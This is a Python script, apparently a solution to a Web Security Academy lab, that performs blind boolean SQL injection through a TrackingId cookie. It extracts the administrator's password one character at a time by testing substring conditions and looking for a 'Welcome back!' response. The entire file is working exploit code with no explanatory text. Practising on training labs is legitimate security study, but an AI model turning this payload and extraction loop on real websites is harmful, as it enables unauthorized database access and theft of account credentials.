import requests
import string
password = []
letters = list(string.ascii_lowercase)
numbers = list(string.digits)
characters = letters + numbers
check_string = 'Welcome back!'
for i in range (1,21):
    for j in characters:
        payload = f"RtxRbwpo40x7dnjX' and substring((select password from users where username = 'administrator'), {i}, 1) = '{j}"
        cookies = {"TrackingId" : payload, "session": "vhEX9qo1R6pB4cING5PDnOzcLDtMmXfF"}
        r = requests.get ('https://0a5900fe03e4ec84c05a123b00830066.web-security-academy.net/',cookies=cookies)
        print (f"[+] Trying characeter {j} for poisition {i} for password")
        if check_string in r.text:
            password.append(j)
            break
        else:
            print ('It does not contain welcome back')
print (password)
